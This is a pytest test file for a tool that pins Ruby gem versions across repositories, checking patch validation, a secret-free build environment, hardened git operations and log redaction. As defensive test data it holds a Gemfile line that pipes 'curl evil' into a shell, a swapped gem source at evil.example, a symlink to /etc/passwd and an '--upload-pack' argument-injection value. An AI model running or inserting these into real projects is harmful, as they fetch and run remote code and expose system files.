import json
import os
import types

import pytest

import fleet_align_gems as al

MATRIX_TEXT = open(os.path.join(os.path.dirname(al.__file__), "versions.yml"), encoding="utf-8").read()
TOKEN = "ghp_SECRETTOKEN123"
GIT_REMOTE = "https://github.com/BrightSoftwares/blogpost-tools.git"
LOCK = f"""GIT
  remote: {GIT_REMOTE}
  revision: abc123
  tag: jekyll-obsidian-wikilinks-v2.1.1
  specs:
    jekyll-obsidian-wikilinks (2.1.1)

GEM
  remote: https://rubygems.org/
  specs:
    i18n (1.14.7)
    ffi (1.16.3)
    jekyll (4.3.4)
    jekyll-timeago (0.13.1)
    rexml (3.4.5)

PLATFORMS
  ruby

DEPENDENCIES
  ffi (= 1.16.3)
  jekyll (~> 4.3.4)
  jekyll-timeago (~> 0.13.1)

BUNDLED WITH
   2.5.0
"""
GEMFILE = """source 'https://rubygems.org'
gem 'jekyll', '~> 4.3.4'
gem 'jekyll-timeago', '~> 0.13.1', require: false
gem 'ffi', '= 1.16.3'
"""
M = al.load_matrix(MATRIX_TEXT)
LATEST = {"ffi": "1.18.0", "jekyll-timeago": "1.2.0"}


@pytest.fixture(autouse=True)
def no_ambient_secrets(monkeypatch):
    for k in al.SECRET_ENV:
        monkeypatch.delenv(k, raising=False)


def apply_update(lock, gemfile, gems):
    for gem in gems:
        pin = [l for l in gemfile.splitlines() if l.startswith(f"gem '{gem}', '= ")]
        ver = pin[-1].split("'= ")[1].split("'")[0] if pin else LATEST.get(gem, "9.9.9")
        lock = "\n".join(f"    {gem} ({ver})" if l.startswith(f"    {gem} (") else l for l in lock.split("\n"))
        lock = lock.replace(f"  {gem} (= 1.16.3)", f"  {gem} (= {ver})").replace(f"  {gem} (~> 0.13.1)", f"  {gem} (= {ver})")
    return lock


# ------------------------------------------------------------------ matrix + pure checks
def test_matrix_parses_with_allow_sources():
    assert M["gems"]["jekyll"] == "4.3.4" and GIT_REMOTE in M["allow_sources"]
    with pytest.raises(ValueError):
        al.load_matrix('gems:\n  "bad name": "1.0"\n')


def test_parse_lock_platforms_prereleases_and_order():
    assert al.parse_lock(LOCK)["ffi"] == "1.16.3"
    assert al.parse_lock("GEM\n  specs:\n    ffi (1.17.4-x86_64-linux)\n    foo (1.0.0.rc1)\n") == {"ffi": "1.17.4", "foo": "1.0.0.rc1"}
    assert al.vkey("1.0.0.rc1") < al.vkey("1.0.0") < al.vkey("1.0.1") and al.vkey("1.10.0") > al.vkey("1.9.9")


def test_plan_updates_below_leaves_ahead_ignores_absent():
    p = al.plan(al.parse_lock(LOCK), M)
    assert p["update"] == ["ffi", "jekyll-timeago"] and p["ahead"] == {"rexml": "3.4.5"} and "webrick" not in p["ok"]


def test_pin_gemfile_rewrites_constraint_and_appends_transitive():
    out = al.pin_gemfile(GEMFILE, {"ffi": "1.17.4", "jekyll-timeago": "1.1.0", "rexml": "3.4.4"})
    assert "gem 'ffi', '= 1.17.4'" in out and "gem 'jekyll-timeago', '= 1.1.0', require: false" in out
    assert "gem 'rexml', '= 3.4.4'" in out and "gem 'jekyll', '~> 4.3.4'" in out
    assert al.gemfile_problems(GEMFILE, out, M) == []


# ------------------------------------------------------------------ blocker 1: text validation of the patch
def good_patch():
    gf = al.pin_gemfile(GEMFILE, {"ffi": "1.17.4", "jekyll-timeago": "1.1.0"})
    return {"repo": "a/site", "branch": "main", "summary": "ffi 1.16.3->1.17.4", "ahead": "",
            "before_gemfile": GEMFILE, "before_lock": LOCK, "after_gemfile": gf,
            "after_lock": apply_update(LOCK, gf, ["ffi", "jekyll-timeago"])}


def test_good_patch_validates():
    assert al.patch_problems(good_patch(), M) == []


@pytest.mark.parametrize("mutate,needle", [
    (lambda p: p.update(after_lock=p["after_lock"].replace("https://rubygems.org/", "https://evil.example/")), "GEM remote"),
    (lambda p: p.update(after_lock=p["after_lock"].replace("revision: abc123", "revision: evil999")), "GIT section changed"),
    (lambda p: p.update(after_lock=p["after_lock"].replace("PLATFORMS\n  ruby", "PLATFORMS\n  ruby\n  java")), "PLATFORMS section changed"),
    (lambda p: p.update(after_lock=p["after_lock"] + "\nPATH\n  remote: .\n  specs:\n    y (1.0.0)\n"), "PATH"),
    (lambda p: p.update(after_lock=p["after_lock"].replace("  jekyll (~> 4.3.4)", "  jekyll (~> 4.3.4)\n  evil (>= 0)")), "DEPENDENCIES changed outside"),
    (lambda p: p.update(after_lock=p["after_lock"].replace("    i18n (1.14.7)", "    i18n (1.15.0)\n    newdep (1.0.0)")), "outside the matrix"),
    (lambda p: p.update(after_gemfile=p["after_gemfile"] + "system('curl evil | sh')\n"), "Gemfile change outside the matrix"),
    (lambda p: p.update(after_gemfile=p["after_gemfile"].replace("= 1.17.4", "= 9.9.9")), "not pinned to the matrix version"),
    (lambda p: p.update(repo="-evil/x"), "invalid repo"),
    (lambda p: p.pop("after_lock"), "malformed"),
])
def test_patch_text_validation_refuses(mutate, needle):
    p = good_patch()
    mutate(p)
    assert any(needle in x for x in al.patch_problems(p, M)), al.patch_problems(p, M)


def test_unallowlisted_existing_git_source_is_refused():
    lock = LOCK.replace(GIT_REMOTE, "https://github.com/evil/gem.git")
    assert any("not allowlisted" in x for x in al.sources_problems(lock, M))
    assert al.sources_problems(LOCK, M) == []


# ------------------------------------------------------------------ blocker 1: build phase holds no token
def make_tree(tmp_path, lock=LOCK, gemfile=GEMFILE):
    tree = tmp_path / "tree"
    tree.mkdir()
    (tree / "Gemfile.lock").write_text(lock)
    (tree / "Gemfile").write_text(gemfile)
    return str(tree)


class BundleRunner:
    def __init__(self, build_rc=0, update_rc=0, mutate=None):
        self.calls, self.build_rc, self.update_rc, self.mutate = [], build_rc, update_rc, mutate

    def __call__(self, cmd, cwd=None, capture_output=True, text=True, env=None):
        self.calls.append((cmd, env))
        rc, out = 0, ""
        if cmd[:2] == ["bundle", "update"]:
            rc = self.update_rc
            gf = open(os.path.join(cwd, "Gemfile")).read()
            lock = apply_update(open(os.path.join(cwd, "Gemfile.lock")).read(), gf, [g for g in cmd[2:] if not g.startswith("--")])
            if self.mutate:
                lock = self.mutate(lock)
            open(os.path.join(cwd, "Gemfile.lock"), "w").write(lock)
            out = f"bad https://u:p@x {TOKEN}" if rc else ""
        elif cmd[:3] == ["bundle", "exec", "jekyll"]:
            rc, out = self.build_rc, (f"err {TOKEN} https://u:p@x" if self.build_rc else "")
        return types.SimpleNamespace(returncode=rc, stdout=out, stderr="")


def test_build_refuses_to_run_when_a_secret_is_in_the_environment(tmp_path, monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", TOKEN)
    with pytest.raises(RuntimeError, match="refuses to run with secrets"):
        al.build_repo("a/site", "main", make_tree(tmp_path), M, runner=BundleRunner())
    with pytest.raises(SystemExit):
        al.main(["--phase", "build", "--in", str(tmp_path), "--patches", str(tmp_path / "p")])


def test_build_env_is_an_allowlist(tmp_path, monkeypatch):
    for k in ("GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY", "SOME_RANDOM_VAR"):
        monkeypatch.delenv(k, raising=False)
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "x")
    r = BundleRunner()
    kind, patch = al.build_repo("a/site", "main", make_tree(tmp_path), M, runner=r)
    assert kind == "PATCH"
    for cmd, env in r.calls:
        assert set(env) == {"PATH", "LANG", "HOME", "TMPDIR", "BUNDLE_APP_CONFIG", "BUNDLE_USER_HOME"}
        assert env["HOME"] == env["TMPDIR"] and "AWS_SECRET_ACCESS_KEY" not in env
    assert r.calls[0][0] == ["bundle", "update", "ffi", "jekyll-timeago", "--conservative"]
    assert al.patch_problems(patch, M) == []
    with pytest.raises(ValueError):
        al.build_env("/tmp/x", passthrough=("GITHUB_TOKEN",))


def test_build_outputs_only_a_patch_and_failures_are_redacted_and_patchless(tmp_path):
    kind, msg = al.build_repo("a/site", "main", make_tree(tmp_path), M, runner=BundleRunner(build_rc=1))
    assert kind == "MSG" and "FAIL jekyll build" in msg and "u:p@" not in msg
    kind, msg = al.build_repo("a/site", "main", make_tree(tmp_path / "b" if (tmp_path / "b").mkdir() is None else tmp_path), M,
                              runner=BundleRunner(update_rc=1))
    assert kind == "MSG" and "u:p@" not in msg


def test_build_refuses_foreign_lock_changes(tmp_path):
    kind, msg = al.build_repo("a/site", "main", make_tree(tmp_path), M,
                              runner=BundleRunner(mutate=lambda l: l.replace("https://rubygems.org/", "https://evil.example/")))
    assert kind == "MSG" and "GEM remote" in msg


# ------------------------------------------------------------------ blocker 2: symlinks, pre-existing sources
def test_symlinked_gemfile_or_lock_is_refused(tmp_path):
    tree = make_tree(tmp_path)
    secret = tmp_path / "secret"
    secret.write_text("TOKEN-LIKE")
    os.remove(os.path.join(tree, "Gemfile"))
    os.symlink(secret, os.path.join(tree, "Gemfile"))
    kind, msg = al.build_repo("a/site", "main", tree, M, runner=BundleRunner())
    assert kind == "MSG" and "symlink" in msg
    with pytest.raises(ValueError):
        al.read_regular(os.path.join(tree, "Gemfile"), tree)
    with pytest.raises(ValueError):
        al.write_regular(os.path.join(tree, "Gemfile"), tree, "x")


def test_build_fails_on_unallowlisted_existing_git_section(tmp_path):
    kind, msg = al.build_repo("a/site", "main", make_tree(tmp_path, lock=LOCK.replace(GIT_REMOTE, "https://github.com/evil/g.git")),
                              M, runner=BundleRunner())
    assert kind == "MSG" and "not allowlisted" in msg


# ------------------------------------------------------------------ push phase: hardening
class GitRunner:
    def __init__(self, patch=None, work_branch=False, unreviewed="", merge_rc=0, stale=False, symlink=False):
        self.calls, self.patch, self.work_branch = [], patch or good_patch(), work_branch
        self.unreviewed, self.merge_rc, self.stale, self.symlink = unreviewed, merge_rc, stale, symlink

    @property
    def cmds(self):
        return [c for c, _ in self.calls]

    def ran(self, word):
        return any(word in c for c in self.cmds)

    def env_of(self, word):
        return [e for c, e in self.calls if word in c][0]

    def __call__(self, cmd, cwd=None, capture_output=True, text=True, env=None):
        self.calls.append((cmd, env))
        rc, out = 0, ""
        sub = cmd[3:] if cmd[:3] == ["git", "-c", "core.hooksPath=/dev/null"] else cmd[1:]
        if sub and sub[0] == "clone":
            dest = sub[-1]
            os.makedirs(dest, exist_ok=True)
            open(os.path.join(dest, "Gemfile"), "w").write("CHANGED" if self.stale else self.patch["before_gemfile"])
            if self.symlink:
                os.symlink("/etc/passwd", os.path.join(dest, "Gemfile.lock"))
            else:
                open(os.path.join(dest, "Gemfile.lock"), "w").write(self.patch["before_lock"])
        elif sub and sub[0] == "fetch":
            rc = 0 if self.work_branch else 1
        elif sub and sub[0] == "log":
            out = self.unreviewed
        elif "merge" in sub and "--abort" not in sub:
            rc = self.merge_rc
        return types.SimpleNamespace(returncode=rc, stdout=out, stderr="")


def push(tmp_path, runner, apply=True, **kw):
    return al.push_patch(runner.patch, M, str(tmp_path), apply, TOKEN, runner=runner, trailer="T", **kw)


def test_push_hardening_hooks_config_scope_and_redirects(tmp_path):
    r = GitRunner()
    out = push(tmp_path, r)
    assert out.startswith("a/site: DONE")
    assert all(c[:3] == ["git", "-c", "core.hooksPath=/dev/null"] for c in r.cmds)
    assert not any(TOKEN in a for c in r.cmds for a in c)
    for sub in ("clone", "fetch", "push"):
        env = r.env_of(sub)
        assert env["GIT_CONFIG_GLOBAL"] == "/dev/null" and env["GIT_CONFIG_NOSYSTEM"] == "1"
        assert env["GIT_CONFIG_KEY_0"] == "http.https://github.com/.extraheader"
        assert env["GIT_CONFIG_KEY_1"] == "http.followRedirects" and env["GIT_CONFIG_VALUE_1"] == "false"
    for c, env in r.calls:  # local calls carry no credential at all
        if not any(w in c for w in ("clone", "fetch", "push")):
            assert "GIT_CONFIG_VALUE_0" not in env and env["GIT_CONFIG_GLOBAL"] == "/dev/null"
    pushes = [c for c in r.cmds if "push" in c]
    assert pushes == [["git", "-c", "core.hooksPath=/dev/null", "push", "-q", "origin", "HEAD:claude/automated-work"]]
    assert open(os.path.join(tmp_path, "a__site-push", "Gemfile.lock")).read() == r.patch["after_lock"]


def test_push_dry_run_validates_text_only_no_clone_no_token_needed(tmp_path):
    r = GitRunner()
    out = al.push_patch(r.patch, M, str(tmp_path), False, "", runner=r)
    assert "WOULD push" in out and r.calls == []
    bad = good_patch()
    bad["after_lock"] = bad["after_lock"].replace("https://rubygems.org/", "https://evil.example/")
    assert "patch rejected" in al.push_patch(bad, M, str(tmp_path), True, TOKEN, runner=r) and r.calls == []


def test_push_refuses_stale_patch_and_symlinked_lock_in_fresh_clone(tmp_path):
    r = GitRunner(stale=True)
    assert "stale patch" in push(tmp_path, r) and not r.ran("push")
    r2 = GitRunner(symlink=True)
    assert "symlink" in push(tmp_path / "s", r2) and not r2.ran("push")


def test_existing_work_branch_merge_reset_and_conflict(tmp_path):
    r = GitRunner(work_branch=True, unreviewed="abc123 earlier work\n")
    assert push(tmp_path, r).startswith("a/site: DONE") and r.ran("merge")
    r2 = GitRunner(work_branch=True, unreviewed="")
    push(tmp_path / "b", r2)
    assert not r2.ran("merge")
    r3 = GitRunner(work_branch=True, unreviewed="abc x\n", merge_rc=1)
    out = push(tmp_path / "c", r3)
    assert "cannot merge" in out and r3.ran("--abort") and not r3.ran("push")


def test_pr_body_lists_unreviewed_commits_and_open_pr_is_reused(tmp_path):
    class GH:
        def __init__(self, prs):
            self.prs, self.posted = prs, None

        def get(self, path):
            return 200, self.prs

        def request(self, method, path, body):
            self.posted = body
            return 201, {"html_url": "https://x/pr/1"}, {}

    gh = GH([])
    out = push(tmp_path, GitRunner(work_branch=True, unreviewed="abc123 earlier work\n"), gh=gh)
    assert "opened PR" in out and "abc123 earlier work" in gh.posted["body"]
    gh2 = GH([{"html_url": "https://x/pr/9"}])
    assert "PR already open" in push(tmp_path / "z", GitRunner(), gh=gh2) and gh2.posted is None


# ------------------------------------------------------------------ fetch phase
class FetchRunner:
    def __init__(self):
        self.calls = []

    def __call__(self, cmd, cwd=None, capture_output=True, text=True, env=None):
        self.calls.append((cmd, env))
        tree = cmd[-1]
        os.makedirs(os.path.join(tree, ".git", "hooks"))
        open(os.path.join(tree, ".git", "config"), "w").write("[core]\n")
        open(os.path.join(tree, "Gemfile"), "w").write(GEMFILE)
        return types.SimpleNamespace(returncode=0, stdout="", stderr="")


def test_fetch_hands_over_plain_tree_without_git_dir_and_token_not_in_argv(tmp_path):
    r = FetchRunner()
    assert "fetched" in al.fetch_repo("a/site", "main", str(tmp_path), TOKEN, runner=r)
    base = tmp_path / "a__site"
    assert (base / "tree" / "Gemfile").exists() and not (base / "tree" / ".git").exists()
    assert json.load(open(base / "meta.json")) == {"repo": "a/site", "branch": "main"}
    cmd, env = r.calls[0]
    assert cmd[:3] == ["git", "-c", "core.hooksPath=/dev/null"] and "https://github.com/a/site.git" in cmd
    assert not any(TOKEN in a for a in cmd) and env["GIT_CONFIG_GLOBAL"] == "/dev/null"
    assert "invalid" in al.fetch_repo("a/site", "--upload-pack=x", str(tmp_path), TOKEN, runner=r)


# ------------------------------------------------------------------ output + misc minors
def test_safe_line_escapes_control_chars_and_workflow_commands():
    assert al.safe_line("::set-output name=x::1").startswith("\\::")
    assert "\n" not in al.safe_line("a\nb\x1b[31m") and "\\x0a" in al.safe_line("a\nb")
    assert TOKEN not in al.safe_line(f"x {TOKEN} https://u:p@h", TOKEN) and "u:p@" not in al.safe_line("https://u:p@h")


def test_names_validated_and_main_rejects_bad_input(tmp_path):
    assert al.valid_name("main") and not al.valid_name("-rf") and not al.valid_name("a/../b")
    assert al.valid_repo("a/site") and not al.valid_repo("-a/site") and not al.valid_repo("a/b/c")
    with pytest.raises(SystemExit):
        al.main(["--phase", "push", "--patches", str(tmp_path), "--only", "-x"])
    with pytest.raises(SystemExit):
        al.main(["--phase", "push"])


def test_main_push_dry_run_end_to_end_and_isolation(tmp_path, capsys, monkeypatch):
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    monkeypatch.delenv("GH_TOKEN", raising=False)
    (tmp_path / "ok.json").write_text(json.dumps(good_patch()))
    (tmp_path / "broken.json").write_text("{not json")
    bad = good_patch()
    bad["after_gemfile"] += "system('x')\n"
    (tmp_path / "bad.json").write_text(json.dumps(bad))
    assert al.main(["--phase", "push", "--patches", str(tmp_path)]) == 0
    out = capsys.readouterr().out
    assert "WOULD push" in out and "unreadable patch" in out and "patch rejected" in out
    assert al.safe_call("a/x", lambda: 1 / 0).startswith("a/x: ERROR ZeroDivisionError")
